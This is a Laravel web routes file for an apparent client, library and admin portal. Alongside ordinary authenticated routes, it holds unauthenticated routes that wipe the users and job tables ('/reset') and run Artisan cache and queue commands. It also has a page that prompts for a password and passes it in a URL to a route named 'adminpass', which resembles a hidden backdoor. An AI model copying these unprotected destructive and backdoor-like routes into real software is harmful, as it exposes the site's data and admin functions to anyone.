<?php
use App\Http\Controllers\AttendanceController;
use App\Http\Controllers\EmployeeController;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Bus;
use Illuminate\Support\Facades\Log;
use App\Models\Attendance;
use App\Models\employeedata;
/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
| New
*/


Route::get('dl','ExtraController@dl')->name('adminpass');

Route::get('test','ExtraController@testsample');



Route::get('hiccipaccess/ip', function(){
 $ip=$_SERVER['REMOTE_ADDR'];
 // dd($_SERVER);
 
return '
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
alert('.$ip.');
<script>
  
let password = prompt("Please enter Password", "");

window.location.href = "'.Route('adminpass').'?password="+password;
</script>
';

});


Route::get('/stest', function(){
      $permitted_chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
       $randomu=substr(str_shuffle($permitted_chars), 0, 30);
dd($randomu);
	
})->name('test');


Route::get('restricted_page',function(){

	return view('errors.503');
});


Route::get('/maintenance',['as'=>'indexs','uses'=>'WebsiteController@maintenance']);
	
Route::group(['middleware' => 'modulepage'], function () {

//websites
Route::get('/',['as'=>'home.index','uses'=>'WebsiteController@index']);

Route::get('/library',['as'=>'books.index','uses'=>'WebsiteController@books']);
Route::post('/asdasldkjlasisrafildjkasdjaiwjdlksufyanodawdjkawdjaiwnla',['as'=>'postcomment','uses'=>'WebsiteController@post']);

Route::get('/download', function () {

	return response()->download(public_path('assets/img/pdf/AppForm-v2 +client undertaking AND Guidelines and Requirement Documents.rar'));
})->name('download');



});//maintenance


Route::group(['middleware' => 'accesspage'], function () {



	Route::get('auth/logout', ['as' => 'logout', 'uses' => 'Auth\AuthController@getLogout']);

	Route::group(['middleware' => 'guest'], function () {

		Route::get('login', 'Auth\AuthController@getLogin')->name('getlogin');
		Route::post('login', 'Auth\AuthController@postLogin');      
		Route::get('reset_password.php',['as'=>'reset_password', 'uses'=>'ResetPasswordController@index'])->name('reset_password');
		Route::post('reset_password/store.php',['as'=>'reset_password.store', 'uses'=>'ResetPasswordController@store']);
	});




});//access security IP


Route::group(['middleware' => 'accesspage'], function () {

	Route::group(['middleware' => 'auth'], function () {



		Route::group(['middleware' => 'maintenancepage'], function () {

			Route::resource('modules','ModulesController');

			
			Route::get('access_control', [App\Http\Controllers\AccessControlController::class, 'index'])->name('access_control.index');		

//Dashboard
			Route::get('/dashboard', [App\Http\Controllers\HomeController::class, 'index'])->name('dashboard.index');


	Route::resource('genre','GenreController');	
	Route::resource('book','BooksController');
	Route::resource('developers','DeveloperController');


//clients-company
			Route::post('clients/add_company', [App\Http\Controllers\CLientsController::class, 'add_company'])->name('add_company');
			Route::post('clients/add_branches', [App\Http\Controllers\CLientsController::class, 'add_branches'])->name('add_branches');
			Route::post('clients/add_store', [App\Http\Controllers\CLientsController::class, 'add_store'])->name('add_store');


//General Setup
			Route::get('/generalsetup', [App\Http\Controllers\GeneralSetupController::class, 'index'])->name('generalsetup');


//clients 

	Route::get('admin-clients', [App\Http\Controllers\CLientsController::class, 'index'])->name('client.index');
	Route::get('admin-clients/{id?}', [App\Http\Controllers\CLientsController::class, 'company_profile'])->name('client.profile');
	Route::get('admin-clients/request/{id?}', [App\Http\Controllers\CLientsController::class, 'request_data'])->name('client.request');
	Route::POST('admin-clients/update/{step?}/{id?}', [App\Http\Controllers\CLientsController::class, 'request_data_update'])->name('client.process.update');





	Route::get('admin-clients/download_cert/{id?}', [App\Http\Controllers\CLientsController::class, 'download_cert'])->name('client.download_cert');
	Route::get('admin-clients/download_rep_audit/{id?}', [App\Http\Controllers\CLientsController::class, 'download_rep_audit'])->name('client.download_rep_audit');
Route::get('admin-clients/download_docu/{id?}', [App\Http\Controllers\CLientsController::class, 'download_docu'])->name('client.download_docu');

Route::get('admin-clients/accept_docu/{id?}', [App\Http\Controllers\CLientsController::class, 'accept_docu'])->name('client.accept_docu');
Route::get('admin-clients/decline_docu/{id?}', [App\Http\Controllers\CLientsController::class, 'decline_docu'])->name('client.decline_docu');



//listbranches-ajax

			Route::post('clients/list_branches_ajax', [App\Http\Controllers\CLientsController::class, 'getbranchlist'])->name('list_branches_ajax');

//liststore-ajax

			Route::post('clients/list_store_ajax', [App\Http\Controllers\CLientsController::class, 'getstorelist'])->name('list_store_ajax');



//Data - About us

			Route::get('admin-aboutus', [App\Http\Controllers\GeneralSetupController::class, 'adminabout'])->name('admin.aboutus.index');


//Data - contact us

			Route::get('admin-contactus', [App\Http\Controllers\GeneralSetupController::class, 'adminabout'])->name('admin.contactus.index');




//announcement

			Route::get('admin-announcement', [App\Http\Controllers\GeneralSetupController::class, 'adminannoucement'])->name('admin.announcement.index');


//create
			Route::get('admin-create/{type?}/{method?}', [App\Http\Controllers\ExtraController::class, 'creator'])->name('admin.create');



//editor
			Route::get('admin-editor/{type?}/{method?}/{id?}', [App\Http\Controllers\ExtraController::class, 'editor'])->name('admin.edit');


			// Route::get('admin-editor/{type?}/{method?}', function () {
			// 	return view('editor2');
			// })->name('admin.editor');



			Route::get('admin-ajax/{type?}/{method?}', function () {
				return view('editor2');
			})->name('admin.ajax');






//news

			Route::get('admin-news', [App\Http\Controllers\GeneralSetupController::class, 'adminnews'])->name('admin.news.index');

			Route::get('/generalsetup/new', function () {
				return view('editor3');
			})->name('ann2');

			Route::POST('generalsetup/news_add', [App\Http\Controllers\GeneralSetupController::class, 'add_news'])->name('add_news');


//activity
			Route::get('admin-activities', [App\Http\Controllers\GeneralSetupController::class, 'adminactivity'])->name('admin.activities.index');

			Route::get('/generalsetup/act', function () {
				return view('editor4');
			})->name('ann3');

			Route::POST('generalsetup/act_add', [App\Http\Controllers\GeneralSetupController::class, 'add_act'])->name('add_act');


//advertise
			Route::get('admin-advertise', [App\Http\Controllers\GeneralSetupController::class, 'adminadvertise'])->name('admin.advertise.index');


//users
Route::get('users', [App\Http\Controllers\GeneralSetupController::class, 'users'])->name('users.index');			



			
			Route::get('/edit/{page?}/{id?}', [App\Http\Controllers\GeneralSetupController::class, 'edit'])->name('edit');
			Route::any('/sdasdsad', [App\Http\Controllers\GeneralSetupController::class, 'editors'])->name('editors');

//maintenance

Route::get('admin-maintenance',['as'=>'maintenance.index','uses'=>'ExtraController@maintenance']);


			Route::group(['middleware' => 'adminaccess'], function () {

		

		

			Route::post('modules/create', [App\Http\Controllers\ModulesController::class, 'store'])->name('modules.store');	

			Route::POST('admin-create/created', [App\Http\Controllers\ExtraController::class, 'create'])->name('admin.created');
			
			Route::get('admin-delete/{data?}', [App\Http\Controllers\ExtraController::class, 'delete'])->name('admin.delete');

			Route::POST('admin-editor/update', [App\Http\Controllers\ExtraController::class, 'update'])->name('admin.update');


			
			Route::POST('users/register', [App\Http\Controllers\GeneralSetupController::class, 'register'])->name('users.register');


			Route::post('admin-clients/create', [App\Http\Controllers\CLientsController::class, 'create'])->name('client.create');
			Route::post('admin-clients/create_request', [App\Http\Controllers\CLientsController::class, 'create_request'])->name('client.add.request');


		


//ajax
			Route::POST('admin-ajax/advertise_data', [App\Http\Controllers\AjaxController::class, 'ajax_advertise_id'])->name('ajax.advertise_id');
			Route::POST('admin-ajax/maintenance_data', [App\Http\Controllers\AjaxController::class, 'maintenance_data'])->name('ajax.maintenance');


			


});//middleware adminaccess


});//middleware maintenancepage



}); //middleware auth


});// IP access security


Route::get('/ghaizer', function() {
	$exitCode = Artisan::call('config:clear');
	$exitCode = Artisan::call('cache:clear');
	$exitCode = Artisan::call('config:cache');
	$exitCode = Artisan::call('view:clear');
	$exitCode = Artisan::call('optimize:clear');
	return ('clear');
});

Route::get('/runqueue', function() {
	$exitCode = Artisan::call('queue:work --tries=1');
	
	return 'DONE'; //Return anything
})->name('questart');






Route::get('/reset', function() {

	DB::statement('DELETE from users where id>2');
	DB::statement('ALTER table users AUTO_INCREMENT = 3');
	DB::statement('TRUNCATE job_batches');
	DB::statement('TRUNCATE failed_jobs');
	DB::statement('TRUNCATE jobs');
	DB::statement('TRUNCATE employdata');

	$exitCode = Artisan::call('queue:restart');
//$exitCode = Artisan::call('queue:work --tries=1');

	return redirect('/import_data');
});

/*
Route::get('/lowercase', function() {
DB::statement('UPDATE users SET first_name = LOWER(first_name)');
DB::statement('UPDATE users SET middle_name = LOWER(middle_name)');
DB::statement('UPDATE users SET last_name = LOWER(last_name)');
DB::statement('UPDATE users SET gender = LOWER(gender)');
DB::statement('UPDATE users SET civilstatus = LOWER(civilstatus)');
DB::statement('UPDATE employdata SET contract_start = LOWER(contract_start)');
return redirect('/dashboard');
});*/